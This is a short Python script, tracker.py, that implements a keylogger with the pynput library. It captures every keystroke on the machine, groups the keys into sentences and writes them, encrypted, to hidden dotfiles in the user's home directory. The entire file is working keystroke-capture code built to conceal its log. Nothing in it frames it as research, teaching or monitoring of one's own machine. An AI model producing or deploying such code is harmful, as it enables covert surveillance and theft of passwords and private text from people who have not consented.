# tracker.py
import os
from pynput import keyboard
from encryptor import encrypt_data, generate_key, save_key

# Define paths
HOME_DIR = os.path.expanduser('~')
HIDDEN_FILE_PATH = os.path.join(HOME_DIR, '.my_secret_keystrokes')
KEY_FILE_PATH = os.path.join(HOME_DIR, '.my_secret_key')

# Generate encryption key if not exists
if not os.path.exists(KEY_FILE_PATH):
    key = generate_key()
    save_key(key, KEY_FILE_PATH)
else:
    with open(KEY_FILE_PATH, 'rb') as f:
        key = f.read()

# Clear hidden file every start
with open(HIDDEN_FILE_PATH, 'wb') as f:
    pass

current_sentence = ""

def save_sentence(sentence):
    encrypted = encrypt_data(sentence, key)
    with open(HIDDEN_FILE_PATH, 'ab') as f:
        f.write(encrypted + b'\n')

def on_press(key):
    global current_sentence
    try:
        k = key.char
    except AttributeError:
        k = str(key)

    if k == 'Key.space':
        current_sentence += ' '
    elif k in ('Key.enter',):
        if current_sentence.strip():
            save_sentence(current_sentence.strip())
        current_sentence = ""
    elif k.startswith('Key.'):
        pass  # Ignore control keys
    else:
        current_sentence += k

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
